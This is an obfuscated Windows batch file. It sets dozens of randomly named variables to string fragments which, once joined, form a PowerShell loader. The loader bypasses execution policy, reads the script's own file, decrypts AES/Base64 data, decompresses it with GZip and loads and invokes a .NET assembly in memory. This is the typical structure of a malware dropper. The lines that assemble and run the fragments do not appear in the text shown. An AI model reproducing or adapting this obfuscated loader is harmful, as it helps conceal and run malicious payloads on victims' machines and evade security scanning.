@echo off
set "qTQQRWThOD=('%~f0'"
set "HkBYYEZXtE=.Com"
set "QXOstJdGWs= '')"
set "uxmeKcbRRE=zk ="
set "arQpkHOiAS=$toN"
set "mPLJznJAKs=16] "
set "eOItuCrMIm=yTo("
set "pTlsRlQVxh='')("
set "OMVwLMLUMr=gnir"
set "gYKlNWkyjx='[-1"
set "SQKGzipcTx=-ep "
set "HqXXVZbzNp=daeR"
set "qAFTDtQvnA=[Sys"
set "AzPOwHRVEQ=ecry"
set "CxJmlaXtVo=ect "
set "UvYZrJWmtw=ose("
set "fBLBsPnImK=I = "
set "xuAwRctHZx=)) {"
set "NHBSPBQfpc=mjCJ"
set "GpkooSULsa=yste"
set "wRVoLzjCOm=hy.A"
set "sYyVHUNWpf=.Cre"
set "ygQpPsQEVF=Disp"
set "tsHXORsoPD=mory"
set "HrgYqAaeEk=ke($"
set "KBsRAizaAi=Obje"
set "XUsiOLAIem=PKCS"
set "KZpdElUwgE=d;$D"
set "UHQfLSXifm=FtsB"
set "vcTogOZPtd=ach "
set "KTqOXaySlW=$yrV"
set "UkagqSnEwA=s75K"
set "DJxjjibcDl=rt]:"
set "WFGBtyqAXQ=brea"
set "sEhVHAJhJW=..-1"
set "sUDqTtZMOS=CFxo"
set "FYItYjwrtx=($rZ"
set "YtjBeELvaD=L4Yi"
set "BeUKcOnbyR=.Con"
set "QGBevTHyNP=fore"
set "cDMhyTVEpn=]::("
set "tyfyycRwBA=gjYA"
set "XVGfxuKwVR=t = "
set "fWYhNGSMbO=ateD"
set "gCZwDIPCzW=Lwwt"
set "dRictcNPWR=zHhH"
set "xjlUAgCsbV=ispo"
set "BVucuFWjMy=zuZI"
set "fOnxuQCFkI=ress"
set "MBYzHILNtx=ct S"
set "GAVUPihWxr=();$"
set "eEFZxqLClN= New"
set "UubYaoRRym=V = "
set "AOMwoMQCye=dj0C"
set "UxMGODSorj= = N"
set "GUSYHcIPBv=)($S"
set "tdsFgTjmVJ=g = "
set "NZckiTVyqn=iLww"
set "URmRJGucTY=;$Mj"
set "ihWhxceaOu=and "
set "PBOHoKUPwu=oArr"
set "ZfaJMuMrut=e]::"
set "dWrzbOAvXB=ewLi"
set "eclqjMWyHy=join"
set "cOyNgUvaBi= = $"
set "KRfvFciWKR=ress"
set "mMIEcJzhiw=THwg"
set "cRsozXPIHa=y.Cr"
set "RsnRnLHtCO=Fina"
set "EvbRgKaeVm=pose"
set "CvqkArMabi=pher"
set "eHOIOdfANS=.-16"
set "nEcpzhUODd=wt ="
set "UQECRTZjiK= [st"
set "wpepOGnEaJ=B) {"
set "kDJtwncBns=tem."
set "DraIJnGWcj=.Ass"
set "XgPBMkfEOY=stem"
set "TsNgWSjKya=iLww"
set "QLobCZWXkj=oNzk"
set "fYwbmWdUJC=New-"
set "LYOkQKObGx=n ''"
set "JqIXFIfjkC=urit"
set "UNDVMmLsli=::De"
set "BxaYAsTCKG=('Tg"
set "fjnaKhVEjg=Star"
set "RWLnYLdXdE=oryS"
set "GadjhGoICJ= [Sy"
set "yzGhsxjQEX=rofi"
set "wJxsusnfsI=y]::"
set "zNNwjxsqpE=join"
set "vpFDZXClRH=ew-O"
set "XxGioguzeX=Mode"
set "QYhlryZYFe=]::N"
set "dSnHSfkWut=, (,"
set "lFZcppsRMU=).Sp"
set "YpzEfNqrju=106u"
set "sCajFcMuDB=);$t"
set "hBpXCxhCSa=se()"
set "JfalZNiapo=7;$D"
set "HLeOfabkSV=rity"
set "wkSDvLniCy=l5E7"
set "TfDJaCnanU=Bmor"
set "CwFvXaBuOt='[-1"
set "zoHabcIipK=.Cop"
set "StgZByPFAa=THwg"
set "HoEgoOezgk=[]] "
set "YFagpjpTAX=Comp"
set "HoOEdDVixP=]::("
set "SDuOCRvkoa=flec"
set "ehtaejGMms==');"
set "Afjtxzvjgp=k; }"
set "YLDtVvMQST=Syst"
set "aAEulPrPLC=-4] "
set "BEPanAHvoR=CJS."
set "rtKKnchEWR=ss -"
set "wdBdBbvXPE=esaB"
set "tOiXBCVpyk=S46e"
set "RuybIuedJb=F'[-"
set "rxqQaEFyWu=$toN"
set "icAHQDwEst=raph"
set "qOfhBhxeuV=6] -"
set "oQSHvgFQID=.Dis"
set "mZyuNWoRxm=yste"
set "idKOyxbOfw== $D"
set "NcPyNtbGyb=);$y"
set "BuzPjxZjVB=y.Ci"
set "GbHiURmQsD=grap"
set "DwUzRnIONv=tsWi"
set "EULBbvGfDW=saBm"
set "KrAqVPRwFi=onve"
set "jCUFyBvpbR=TllA"
set "iddiBthAeM=();$"
set "sMMlWEpBnG= if "
set "OgmGzkSkKu=rVuI"
set "zlsuDRTwDS=ert]"
set "XKpKUmpqHy=6esa"
set "zgdnYxtxrQ=RmAx"
set "sqqXZJfGSd=; };"
set "sOHoecJoYl=wg.I"
set "lIUrLHkHHV=.Cry"
set "YRDOIIWnKP=Lwwt"
set "uaCWcUpjpS=gth)"
set "lyhfKpGori=oL'["
set "OrcOwXMFtb=vert"
set "yKbGsVXeHv=ay()"
set "ykxFqaCuXZ=wt);"
set "pLwqMeQfWG=]::C"
set "vHBQRUxkiq=ne);"
set "swVlZUfPJZ= = ["
set "rdGqNDdzPL=ode]"
set "ofhnyPkWMN=] -j"
set "AETITDeagZ=ing("
set "AKyNWJkTas=bypa"
set "GUxNnKUNTU=)($i"
set "equPSSNPmb=, $i"
set "XudjMEdncL=tryP"
set "yGCyGuOWvM=1] -"
set "PkxHRrAWWN=Stre"
set "aPPonwvndi=jbI "
set "XPOAHVXrov=$iLw"
set "ltzIsFWpNU=em.C"
set "kwoMnmvyro=am;$"
set "ZjJpMtdYGx=[Sys"
set "HgITJOcwlL=.Mem"
set "UklQjkwCnk= [Sy"
set "OnIufhZnaE=bstr"
set "qdJlpirQLH=('%*'"
set "MSGxmMfOUx=THwg"
set "rbjrXncEOh= = $"
set "QXgkdMpVIR=morF"
set "FhkvFsdPSP=comp"
set "UmujmobyJX=oin "
set "IZFyFlEetg=ck($"
set "EQGIfKTAtW=PxEW"
set "VlWMpyQAfi=em.I"
set "UHDnVJOKFW=trea"
set "iUgUAMqPKn=.Cry"
set "TSFLvqFjeF=$iLw"
set "sgevoSkaxZ=Secu"
set "BjiCNgrFLZ=m(, "
set "fwJGdeTfcZ=PTtG"
set "mLbfhllNgf=Syst"
set "FWpahHpDiq=-nop"
set "xodFWRMpLD=WYJ."
set "NGGDeDmobA=-joi"
set "DNjvtwVLSD=t Sy"
set "RnLWNTUIor=-1.."
set "YWHdooCppS=;$ea"
set "AukzdLqtfN=)))"
set "KNfLuDLpJb=);$t"
set "NAqQfdToil=eaKH"
set "HCbFkfFVAf=th('"
set "LDtrnrvfxo=CXnL"
set "TdiLxecQAY=.Key"
set "QvCkvdNqAd=DTHw"
set "XAjrSHJpRc=s.En"
set "BYHEujicSs=pStr"
set "TzpTUfWWZl=);$D"
set "znhRLQWsty=jbI."
set "zqVgdSeobT=ptog"
set "dBpxQOmoIE=.GZi"
set "AiqxmXBsHe=-joi"
set "gFBloAyxOe=ionM"
set "akOXxJLsOu=ct S"
